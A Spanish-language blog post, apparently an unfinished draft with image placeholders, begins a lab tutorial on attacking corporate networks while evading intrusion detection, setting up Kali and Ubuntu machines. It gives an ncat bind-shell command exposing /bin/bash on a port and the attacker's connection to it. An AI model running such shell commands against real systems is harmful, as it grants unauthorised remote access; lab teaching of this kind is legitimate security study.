---
title: Atacar redes empresariales y saltar a los sistemas de detección de intrusos(IDS)
author: nik0
date: 2020-11-26 16:38:00 +0800
categories: [Ciberseguridad]
tags: [IDS,Pentesting]
---

## Introducción

En las redes empresariales es muy común ver IDS, IPS y NGFW entre otros tipos de sistemas que reconocen patrones inusuales de conductas no autorizadas, analizan paquetes de red, examinan el tráfico y los puertos, etc.

Por eso cuando queremos hacer una intrusión a un sistema, es muy importante que estos sistemas no detecten lo que hacemos, ya que de lo contrario nos bloquearían la conexión al servidor víctima y no podriamos concluir con lo que queremos hacer.

## Montando el laboratorio

Primero, voy a tener 2 máquinas activas, la primera va a ser Kali (Atacante) y la segunda va a ser una máquina de Ubuntu (Victima), en Ubuntu voy a tener instalado Wireshark para poder capturar los paquetes TCP y poder diferenciar entre una conexión encriptada y otra que no lo está.

## Utilizando Ncat

Vamos a abrir una terminal y ejecutar el comando ```ncat -nlvp 1337 -e /bin/bash``` "n" significa no hay host vinculante, "l" es que para poner a la escucha, "v" para que sea más "detallado" o verboso y "p" significa el puerto a la escucha ```-e /bin/bash``` significa que vamos a tener un entorno en bash, presionamos enter y tiene que estar tal cual en la foto:

(poner foto aki)

luego desde Kali(atacante) nos vamos a conectar a Ubuntu(Víctima), para ello utlizamos el comando ```ncat -nv 172.16.211.131 1337``` ponemos la ip de Ubuntu y el puerto que está a la escucha, presionamos enter y deberia aparecernos así:

(poner foto aki)

## Configurando Wireshark

Antes de ponernos a escribir comandos etc, vamos a poner a Wireshark a seguir los paquetes de red TCP, en mi caso sería la interfaz "ens33" si se deja el cursor un rato ahi, nos muestra la ip de la máquina en este caso la de Kali, lo presionamos 2 veces y ya se puso a la escucha

(poner foto aki)


